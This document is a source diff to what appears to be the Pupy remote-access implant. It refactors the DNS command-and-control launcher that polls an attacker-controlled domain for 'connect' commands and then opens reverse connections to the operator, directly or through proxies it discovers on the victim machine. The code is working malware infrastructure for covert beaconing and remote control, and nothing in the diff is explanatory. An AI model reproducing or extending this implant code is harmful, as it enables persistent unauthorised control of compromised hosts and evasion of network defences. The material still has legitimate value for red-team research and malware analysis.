@@ -17,7 +17,9 @@ from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
 from ..online import PortQuiz, check
 from ..scan import scan
 
-from threading import Thread, Event, Lock
+from threading import Thread, Lock
+
+from time import sleep
 
 import socket
 import os
@@ -26,8 +28,6 @@ import subprocess
 
 import tempfile
 import platform
-
-import network
 
 from network.lib import getLogger
 
@@ -47,7 +47,6 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         self.stream = None
         self.commands = []
         self.lock = Lock()
-        self.new_commands = Event()
 
         try:
             import pupy_credentials
@@ -181,7 +180,6 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                 return
 
             self.commands.append(('connect', ip, port, transport, proxy))
-            self.new_commands.set()
 
     def on_disconnect(self):
         logger.debug('disconnect request [stream=%s]', self.stream)
@@ -203,36 +201,10 @@ class DNSCncLauncher(BaseLauncher):
     credentials = ['DNSCNC_PUB_KEY_V2']
 
     def __init__(self, *args, **kwargs):
-        self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
+        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
         super(DNSCncLauncher, self).__init__(*args, **kwargs)
-
-    def init_argparse(self):
-        self.arg_parser = LauncherArgumentParser(
-            prog='dnscnc', description=self.__doc__
-        )
-
-        self.arg_parser.add_argument(
-            '--domain',
-            metavar='<domain>',
-            required=True,
-            help='controlled domain (hostname only, no IP, '
-               'you should properly setup NS first. Port is NOT supported)'
-        )
-
-        self.arg_parser.add_argument(
-            '--ns', help='DNS server (will use internal DNS library)'
-        )
-
-        self.arg_parser.add_argument(
-            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
-            default=3, type=int,
-        )
-
-        self.arg_parser.add_argument(
-            '--qtype',
-            choices=['A'], default='A',
-            help='DNS query type (For now only A supported)'
-        )
+        self.dnscnc = None
+        self.exited = False
 
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
@@ -243,9 +215,50 @@ class DNSCncLauncher(BaseLauncher):
         self.ns_timeout = self.args.ns_timeout
         self.qtype = self.args.qtype
 
+    def activate(self):
+        if self.args is None:
+            raise LauncherError('parse_args needs to be called before iterate')
+
+        logger.info('Activating CNC protocol. Domain: %s', self.host)
+
+        self.pupy = __import__('pupy')
+        self.dnscnc = DNSCommandClientLauncher(
+            self.host, self.ns, self.qtype, self.ns_timeout)
+        self.dnscnc.daemon = True
+        self.dnscnc.start()
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = LauncherArgumentParser(
+            prog='dnscnc', description=cls.__doc__
+        )
+
+        cls.arg_parser.add_argument(
+            '--domain',
+            metavar='<domain>',
+            required=True,
+            help='controlled domain (hostname only, no IP, '
+               'you should properly setup NS first. Port is NOT supported)'
+        )
+
+        cls.arg_parser.add_argument(
+            '--ns', help='DNS server (will use internal DNS library)'
+        )
+
+        cls.arg_parser.add_argument(
+            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
+            default=3, type=int,
+        )
+
+        cls.arg_parser.add_argument(
+            '--qtype',
+            choices=['A'], default='A',
+            help='DNS query type (For now only A supported)'
+        )
+
     def try_direct_connect(self, command):
         _, host, port, transport, _ = command
-        t = network.conf.transports[transport](
+        t = self.transports[transport](
             bind_payload=self.connect_on_bind_payload
         )
 
@@ -254,7 +267,7 @@ class DNSCncLauncher(BaseLauncher):
         }
 
         transport_args['host'] = '{}{}'.format(
-            self.host, ':{}'.format(self.port) if self.port != 80 else ''
+            host, ':{}'.format(port) if port != 80 else ''
         )
 
         client = t.client()
@@ -281,7 +294,7 @@ class DNSCncLauncher(BaseLauncher):
         for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
                additional_proxies=[connection_proxy] if connection_proxy else None
         ):
-            t = network.conf.transports[transport](
+            t = self.transports[transport](
                 bind_payload=self.connect_on_bind_payload
             )
 
@@ -349,65 +362,87 @@ class DNSCncLauncher(BaseLauncher):
 
             yield stream
 
-
     def iterate(self):
-        import pupy
+        import sys
 
-        if self.args is None:
-            raise LauncherError('parse_args needs to be called before iterate')
+        if not self.dnscnc:
+            self.activate()
 
-        dnscnc = DNSCommandClientLauncher(
-            self.host, self.ns, self.qtype, self.ns_timeout)
+        while not self.exited and not sys.terminated:
+            try:
+                connection = self.process()
+                if not connection:
+                    continue
 
-        dnscnc.daemon = True
+                stream, transport = connection
+                if not stream:
+                    continue
 
-        logger.info('Activating CNC protocol. Domain: %s', self.host)
-        dnscnc.start()
+                logger.debug('stream created, yielding - %s', stream)
 
-        exited = False
+                self.dnscnc.stream = stream
+                self.pupy.infos['transport'] = transport
 
-        while not exited:
-            command = None
+                yield stream
 
-            with dnscnc.lock:
-                if dnscnc.commands:
-                    command = dnscnc.commands.pop()
-                else:
-                    dnscnc.new_commands.clear()
+                with self.dnscnc.lock:
+                    logger.debug('stream completed - %s', stream)
+
+                    self.dnscnc.stream = None
+                    self.pupy.infos['transport'] = None
+
+            except Exception, e:
+                logger.exception(e)
+
+    def process(self):
+        command = None
+        connection = None
+        wait = False
+
+        with self.dnscnc.lock:
+            if self.dnscnc.commands:
+                command = self.dnscnc.commands.pop()
 
             if not command:
-                dnscnc.new_commands.wait()
-                continue
+                wait = True
 
-            if command[0] == 'connect':
-                logger.debug('processing connection command')
+            elif command[0] == 'connect':
+                try:
+                    connection = self.on_connect(command)
+                except socket.error:
+                    pass
 
-                with dnscnc.lock:
-                    logger.debug('connection proxy: %s', command[4])
-                    if command[4]:
-                        logger.debug('omit direct connect')
-                        stream = None
-                    else:
-                        logger.debug('try direct connect')
-                        stream = self.try_direct_connect(command)
+                if not connection:
+                    self.event(0x20000000 | 0xFFFE)
 
-                    if not stream and command[4] is not False:
-                        logger.debug('try connect via proxy')
-                        for stream in self.try_connect_via_proxy(command):
-                            if stream:
-                                break
+        if wait:
+            sleep(5)
 
-                    dnscnc.stream = stream
+        return connection
 
+    def on_connect(self, command):
+        logger.debug('processing connection command')
+
+        stream = None
+        transport = None
+
+        logger.debug('connection proxy: %s', command[4])
+        if command[4]:
+            logger.debug('omit direct connect')
+            stream = None
+        else:
+            logger.debug('try direct connect')
+            stream = self.try_direct_connect(command)
+
+        if not stream and command[4] is not False:
+            logger.debug('try connect via proxy')
+            for stream in self.try_connect_via_proxy(command):
                 if stream:
-                    logger.debug('stream created, yielding - %s', stream)
-                    pupy.infos['transport'] = command[3]
+                    break
 
-                    yield stream
+        if stream:
+            transport = command[3]
+        else:
+            logger.debug('all connection attempt has been failed')
 
-                    with dnscnc.lock:
-                        logger.debug('stream completed - %s', stream)
-                        dnscnc.stream = None
-
-                else:
-                    logger.debug('all connection attempt has been failed')
+        return stream, transport
